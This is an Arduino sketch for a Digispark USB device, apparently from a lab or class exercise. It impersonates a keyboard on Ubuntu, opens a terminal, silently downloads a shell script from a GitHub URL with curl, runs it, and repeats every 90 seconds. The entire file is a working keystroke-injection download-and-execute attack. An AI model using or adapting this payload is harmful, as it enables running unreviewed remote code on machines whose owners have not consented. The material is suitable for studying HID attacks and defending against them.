#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_F1, MOD_ALT_LEFT); // FOR UBUNTU
  DigiKeyboard.delay(1000);

  DigiKeyboard.println("terminal");       // Open terminal
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.println("curl --silent --output \"$HOME/Downloads/all_the_points.sh\" https://raw.githubusercontent.com/acarno/nsl-digispark-hid-attack/master/all_the_points.sh"); // Download script
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  DigiKeyboard.println("sh ./all_the_points.sh"); //Execute
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(90000); // delay 90 seconds
}
